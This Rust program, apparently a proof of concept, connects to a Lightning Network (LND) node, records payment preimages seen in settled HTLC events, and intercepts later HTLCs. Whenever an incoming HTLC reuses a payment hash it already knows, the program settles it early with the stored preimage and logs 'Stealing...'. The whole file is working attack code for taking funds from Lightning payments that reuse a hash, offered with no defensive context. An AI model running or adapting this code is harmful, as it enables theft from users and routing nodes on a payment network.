// This program accepts four arguments: host, port, cert file, macaroon file

use std::collections::HashMap;
use std::sync::Arc;

use sha2::Digest;
use sha2::Sha256;
use tokio::sync::Mutex;
use tokio::task::spawn;

#[tokio::main]
async fn main() {
    let mut args = std::env::args_os();
    args.next().expect("not even zeroth arg given");
    let host = args
        .next()
        .expect("missing arguments: host, port, cert file, macaroon file");
    let port = args
        .next()
        .expect("missing arguments: port, cert file, macaroon file");
    let cert_file = args
        .next()
        .expect("missing arguments: cert file, macaroon file");
    let macaroon_file = args.next().expect("missing argument: macaroon file");
    let host: String = host.into_string().expect("host is not UTF-8");
    let port: u32 = port
        .into_string()
        .expect("port is not UTF-8")
        .parse()
        .expect("port is not u32");
    let cert_file: String = cert_file.into_string().expect("cert_file is not UTF-8");
    let macaroon_file: String = macaroon_file
        .into_string()
        .expect("macaroon_file is not UTF-8");

    // Connecting to LND requires only host, port, cert file, macaroon file
    let mut client = tonic_openssl_lnd::connect(host, port, cert_file, macaroon_file)
        .await
        .expect("failed to connect");
    let client_router = client.router().clone();

    let info = client
        .lightning()
        // All calls require at least empty parameter
        .get_info(tonic_openssl_lnd::lnrpc::GetInfoRequest {})
        .await
        .expect("failed to get info")
        .into_inner();

    // We only print it here, note that in real-life code you may want to call `.into_inner()` on
    // the response to get the message.
    println!("{:#?}", info.alias);

    // hashmap storing preimages and their hashes
    let hash_map: Arc<Mutex<HashMap<Vec<u8>, Vec<u8>>>> = Arc::new(Mutex::new(HashMap::new()));

    // HTLC event stream part
    println!("starting htlc event subscription");
    let mut client_router_htlc_event = client_router.clone();
    let hash_map_htlc_event = hash_map.clone();
    spawn(async move {
        let mut htlc_event_stream = client_router_htlc_event
            .subscribe_htlc_events(tonic_openssl_lnd::routerrpc::SubscribeHtlcEventsRequest {})
            .await
            .expect("Failed to call subscribe_htlc_events")
            .into_inner();

        while let Some(htlc_event) = htlc_event_stream
            .message()
            .await
            .expect("Failed to receive invoices")
        {
            println!("{:#?}", htlc_event);
            if let Some(event) = htlc_event.event {
                if let tonic_openssl_lnd::routerrpc::htlc_event::Event::SettleEvent(settle_event) =
                    event
                {
                    let mut hasher = Sha256::new();
                    hasher.update(&settle_event.preimage);
                    let payment_hash = hasher.finalize();
                    println!(
                        "got preimage {} from payment hash {}",
                        hex::encode(settle_event.preimage.clone()),
                        hex::encode(payment_hash)
                    );

                    let _already_inserted = hash_map_htlc_event
                        .clone()
                        .lock()
                        .await
                        .insert(payment_hash.to_vec(), settle_event.preimage);
                    ()
                };
            }
        }
    });

    println!("started htlc event subscription");

    // HTLC interceptor part
    println!("starting HTLC interception");
    spawn(async move {
        let mut client_router_htlc_intercept = client_router.clone();
        let (tx, rx) = tokio::sync::mpsc::channel::<
            tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse,
        >(1024);
        let stream = tokio_stream::wrappers::ReceiverStream::new(rx);

        let mut htlc_stream = client_router_htlc_intercept
            .htlc_interceptor(stream)
            .await
            .expect("Failed to call htlc_interceptor")
            .into_inner();

        while let Some(htlc) = htlc_stream
            .message()
            .await
            .expect("Failed to receive HTLCs")
        {
            println!("htlc {:?}", htlc);

            let map = hash_map.lock().await;
            let response = match map.get(&htlc.payment_hash) {
                Some(preimage) => {
                    println!("HTLC preimage saved! Stealing...");
                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                        incoming_circuit_key: htlc.incoming_circuit_key,
                        action: 0, // 0 settle, 1 fail, 2 resume
                        preimage: preimage.to_vec(),
                        failure_code: 0,
                        failure_message: vec![],
                    }
                }
                None => {
                    println!("Do not have HTLC preimage, resuming");
                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                        incoming_circuit_key: htlc.incoming_circuit_key,
                        action: 2, // 0 settle, 1 fail, 2 resume
                        preimage: vec![],
                        failure_code: 0,
                        failure_message: vec![],
                    }
                }
            };

            tx.send(response).await.unwrap();
        }
    });

    println!("started htlc event interception");

    // TODO
    loop {}
}
